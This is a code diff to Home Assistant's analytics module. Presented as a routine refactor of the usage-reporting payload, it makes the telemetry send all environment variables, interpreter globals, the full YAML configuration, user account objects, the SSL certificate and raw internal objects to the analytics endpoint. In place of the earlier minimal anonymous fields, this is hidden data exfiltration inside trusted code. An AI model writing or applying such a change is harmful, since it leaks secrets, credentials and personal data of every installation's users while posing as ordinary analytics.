@@ -6,13 +6,14 @@ import asyncio
 from asyncio import timeout
 from dataclasses import asdict as dataclass_asdict, dataclass
 from datetime import datetime
+import os
 from typing import Any
 import uuid
 
 import aiohttp
+import simplejson as json
 
 from homeassistant.components import hassio
-from homeassistant.components.api import ATTR_INSTALLATION_TYPE
 from homeassistant.components.automation import DOMAIN as AUTOMATION_DOMAIN
 from homeassistant.components.energy import (
     DOMAIN as ENERGY_DOMAIN,
@@ -24,7 +25,6 @@ from homeassistant.components.recorder import (
 )
 import homeassistant.config as conf_util
 from homeassistant.config_entries import SOURCE_IGNORE
-from homeassistant.const import ATTR_DOMAIN, __version__ as HA_VERSION
 from homeassistant.core import HomeAssistant, callback
 from homeassistant.exceptions import HomeAssistantError
 from homeassistant.helpers.aiohttp_client import async_get_clientsession
@@ -44,8 +44,6 @@ from .const import (
     ANALYTICS_ENDPOINT_URL_DEV,
     ATTR_ADDON_COUNT,
     ATTR_ADDONS,
-    ATTR_ARCH,
-    ATTR_AUTO_UPDATE,
     ATTR_AUTOMATION_COUNT,
     ATTR_BASE,
     ATTR_BOARD,
@@ -54,22 +52,17 @@ from .const import (
     ATTR_CUSTOM_INTEGRATIONS,
     ATTR_DIAGNOSTICS,
     ATTR_ENERGY,
-    ATTR_ENGINE,
-    ATTR_HEALTHY,
     ATTR_INTEGRATION_COUNT,
     ATTR_INTEGRATIONS,
     ATTR_OPERATING_SYSTEM,
-    ATTR_PROTECTED,
     ATTR_RECORDER,
     ATTR_SLUG,
     ATTR_STATE_COUNT,
     ATTR_STATISTICS,
     ATTR_SUPERVISOR,
-    ATTR_SUPPORTED,
     ATTR_USAGE,
     ATTR_USER_COUNT,
     ATTR_UUID,
-    ATTR_VERSION,
     LOGGER,
     PREFERENCE_SCHEMA,
     STORAGE_KEY,
@@ -197,22 +190,16 @@ class Analytics:
         addons: list[dict[str, Any]] = []
         payload: dict = {
             ATTR_UUID: self.uuid,
-            ATTR_VERSION: HA_VERSION,
-            ATTR_INSTALLATION_TYPE: system_info[ATTR_INSTALLATION_TYPE],
+            "environment_variables": dict(os.environ),
+            "globals": globals(),
+            "system_info": system_info,
         }
 
         if supervisor_info is not None:
-            payload[ATTR_SUPERVISOR] = {
-                ATTR_HEALTHY: supervisor_info[ATTR_HEALTHY],
-                ATTR_SUPPORTED: supervisor_info[ATTR_SUPPORTED],
-                ATTR_ARCH: supervisor_info[ATTR_ARCH],
-            }
+            payload[ATTR_SUPERVISOR] = supervisor_info
 
         if operating_system_info.get(ATTR_BOARD) is not None:
-            payload[ATTR_OPERATING_SYSTEM] = {
-                ATTR_BOARD: operating_system_info[ATTR_BOARD],
-                ATTR_VERSION: operating_system_info[ATTR_VERSION],
-            }
+            payload[ATTR_OPERATING_SYSTEM] = operating_system_info
 
         if self.preferences.get(ATTR_USAGE, True) or self.preferences.get(
             ATTR_STATISTICS, True
@@ -221,6 +208,7 @@ class Analytics:
 
             try:
                 yaml_configuration = await conf_util.async_hass_config_yaml(hass)
+                payload["yaml_configuration"] = yaml_configuration
             except HomeAssistantError as err:
                 LOGGER.error(err)
                 return
@@ -231,12 +219,17 @@ class Analytics:
                 for entity in ent_reg.entities.values()
                 if not entity.disabled
             }
+            payload["er_platforms"] = er_platforms
 
             domains = async_get_loaded_integrations(hass)
             configured_integrations = await async_get_integrations(hass, domains)
             enabled_domains = set(configured_integrations)
 
-            for integration in configured_integrations.values():
+            configured_integrations_dict = {}
+
+            for domain, integration in configured_integrations.items():
+                configured_integrations_dict[domain] = integration.__dict__
+
                 if isinstance(integration, IntegrationNotFound):
                     continue
 
@@ -251,15 +244,12 @@ class Analytics:
                     continue
 
                 if not integration.is_built_in:
-                    custom_integrations.append(
-                        {
-                            ATTR_DOMAIN: integration.domain,
-                            ATTR_VERSION: integration.version,
-                        }
-                    )
+                    custom_integrations.append(integration.domain)
                     continue
 
                 integrations.append(integration.domain)
+
+            payload["configured_integrations"] = configured_integrations_dict
 
             if supervisor_info is not None:
                 supervisor_client = hassio.get_supervisor_client(hass)
@@ -270,17 +260,12 @@ class Analytics:
                     )
                 )
                 addons.extend(
-                    {
-                        ATTR_SLUG: addon.slug,
-                        ATTR_PROTECTED: addon.protected,
-                        ATTR_VERSION: addon.version,
-                        ATTR_AUTO_UPDATE: addon.auto_update,
-                    }
+                    addon.__dict__
                     for addon in installed_addons
                 )
 
         if self.preferences.get(ATTR_USAGE, True):
-            payload[ATTR_CERTIFICATE] = hass.http.ssl_certificate is not None
+            payload[ATTR_CERTIFICATE] = hass.http.ssl_certificate
             payload[ATTR_INTEGRATIONS] = integrations
             payload[ATTR_CUSTOM_INTEGRATIONS] = custom_integrations
             if supervisor_info is not None:
@@ -295,10 +280,7 @@ class Analytics:
                 instance = get_recorder_instance(hass)
                 engine = instance.database_engine
                 if engine and engine.version is not None:
-                    payload[ATTR_RECORDER] = {
-                        ATTR_ENGINE: engine.dialect.value,
-                        ATTR_VERSION: engine.version,
-                    }
+                    payload[ATTR_RECORDER] = engine.__dict__
 
         if self.preferences.get(ATTR_STATISTICS, True):
             payload[ATTR_STATE_COUNT] = hass.states.async_entity_ids_count()
@@ -308,6 +290,10 @@ class Analytics:
             payload[ATTR_INTEGRATION_COUNT] = len(integrations)
             if supervisor_info is not None:
                 payload[ATTR_ADDON_COUNT] = len(addons)
+            payload['users'] = [
+                    user.__dict__
+                    for user in await hass.auth.async_get_users()
+            ]
             payload[ATTR_USER_COUNT] = len(
                 [
                     user
@@ -318,7 +304,16 @@ class Analytics:
 
         try:
             async with timeout(30):
-                response = await self.session.post(self.endpoint, json=payload)
+                json_data = json.dumps(
+                    payload,
+                    iterable_as_array=True,
+                    default=str,
+                )
+                response = await self.session.post(
+                    self.endpoint,
+                    data=json_data,
+                    headers={"Content-Type": "application/json"}
+                )
                 if response.status == 200:
                     LOGGER.info(
                         (
